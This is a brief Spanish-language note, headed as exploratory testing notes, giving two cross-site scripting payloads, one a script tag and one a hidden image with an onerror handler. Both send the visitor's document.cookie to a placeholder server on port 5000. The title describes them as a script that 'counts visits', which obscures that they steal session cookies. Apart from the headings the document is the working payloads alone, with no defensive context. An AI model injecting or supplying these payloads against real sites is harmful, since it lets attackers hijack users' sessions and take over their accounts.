# Notas del proceso de pruebas exploratorias

## Un script que cuenta visitas y pregunta cookies

### Opción 1
```html
<script>
    fetch("http://xxx.xxx.xxxx.xxxx:5000/?cookie="+document.cookie);
</script>
```

### Opción 2
```html
<img style="display:none" src=a onerror=fetch("http://xxx.xxx.xxxx.xxxx:5000/?cookie="+document.cookie)>
```